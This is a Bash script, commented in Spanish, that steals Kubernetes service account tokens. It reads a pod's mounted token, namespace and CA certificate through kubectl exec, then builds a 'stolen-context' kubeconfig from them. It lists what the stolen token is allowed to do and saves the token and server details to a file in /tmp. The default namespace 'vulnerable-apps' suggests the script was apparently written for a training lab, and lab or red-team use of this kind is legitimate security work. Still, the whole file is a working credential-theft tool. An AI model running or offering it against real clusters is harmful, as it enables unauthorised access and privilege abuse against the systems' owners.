#!/bin/bash

# Script para robar tokens de service accounts y usar esos tokens para acceso

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"
POD_NAME="${2:-}"

echo -e "${BLUE}=== Robando Tokens de Service Account ===${NC}\n"

# Si no se especifica el pod, listar y seleccionar
if [ -z "$POD_NAME" ]; then
    PODS=$(kubectl get pods -n "$NAMESPACE" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null)
    
    if [ -z "$PODS" ]; then
        echo -e "${RED}No se encontraron pods en el namespace $NAMESPACE${NC}"
        exit 1
    fi
    
    POD_NAME=$(echo $PODS | cut -d' ' -f1)
    echo -e "${YELLOW}Usando pod: $POD_NAME${NC}"
fi

# 1. Obtener el token del service account
echo -e "${YELLOW}[1] Obteniendo token del service account...${NC}"
TOKEN=$(kubectl exec -it "$POD_NAME" -n "$NAMESPACE" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)

if [ -z "$TOKEN" ]; then
    echo -e "${RED}✗ No se pudo obtener el token${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Token obtenido${NC}"
echo -e "${YELLOW}Token: ${TOKEN:0:50}...${NC}"

# 2. Obtener el namespace del service account
echo -e "\n${YELLOW}[2] Obteniendo namespace...${NC}"
NAMESPACE_SA=$(kubectl exec -it "$POD_NAME" -n "$NAMESPACE" -- cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
echo -e "${GREEN}✓ Namespace: $NAMESPACE_SA${NC}"

# 3. Obtener el CA certificate
echo -e "\n${YELLOW}[3] Obteniendo CA certificate...${NC}"
kubectl exec -it "$POD_NAME" -n "$NAMESPACE" -- cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > /tmp/ca.crt 2>/dev/null
echo -e "${GREEN}✓ CA certificate obtenido${NC}"

# 4. Obtener información del service account
echo -e "\n${YELLOW}[4] Obteniendo información del service account...${NC}"
SERVICE_ACCOUNT=$(kubectl get pod "$POD_NAME" -n "$NAMESPACE" -o jsonpath='{.spec.serviceAccountName}' 2>/dev/null)
echo -e "${GREEN}✓ Service Account: $SERVICE_ACCOUNT${NC}"

# 5. Crear un nuevo contexto con el token robado
echo -e "\n${YELLOW}[5] Creando contexto con el token robado...${NC}"
CLUSTER_NAME=$(kubectl config view --minify -o jsonpath='{.clusters[0].name}' 2>/dev/null || echo "stolen-context")
SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null || echo "")

if [ -n "$SERVER" ]; then
    kubectl config set-credentials stolen-user --token="$TOKEN" 2>/dev/null
    kubectl config set-cluster stolen-cluster --server="$SERVER" --certificate-authority=/tmp/ca.crt 2>/dev/null
    kubectl config set-context stolen-context --cluster=stolen-cluster --user=stolen-user --namespace="$NAMESPACE_SA" 2>/dev/null
    echo -e "${GREEN}✓ Contexto creado: stolen-context${NC}"
fi

# 6. Probar el token
echo -e "\n${YELLOW}[6] Probando el token robado...${NC}"
if kubectl --context=stolen-context auth can-i --list 2>/dev/null; then
    echo -e "${GREEN}✓ Token válido y funcional${NC}"
else
    echo -e "${YELLOW}⚠ Token puede tener permisos limitados${NC}"
fi

# 7. Verificar permisos
echo -e "\n${YELLOW}[7] Verificando permisos del service account...${NC}"
kubectl auth can-i --list --namespace="$NAMESPACE_SA" --token="$TOKEN" 2>/dev/null || \
    echo -e "${YELLOW}   Revisar permisos manualmente${NC}"

# 8. Guardar información
echo -e "\n${YELLOW}[8] Guardando información robada...${NC}"
cat > /tmp/stolen-token-info.txt <<EOF
Service Account: $SERVICE_ACCOUNT
Namespace: $NAMESPACE_SA
Token: $TOKEN
Cluster: $CLUSTER_NAME
Server: $SERVER
EOF

echo -e "${GREEN}✓ Información guardada en /tmp/stolen-token-info.txt${NC}"
echo -e "${YELLOW}Para usar el token:${NC}"
echo -e "  kubectl --context=stolen-context get pods"
echo -e "  kubectl --token=$TOKEN --server=$SERVER --certificate-authority=/tmp/ca.crt get pods"

echo -e "\n${BLUE}=== Robo de Token Completado ===${NC}"

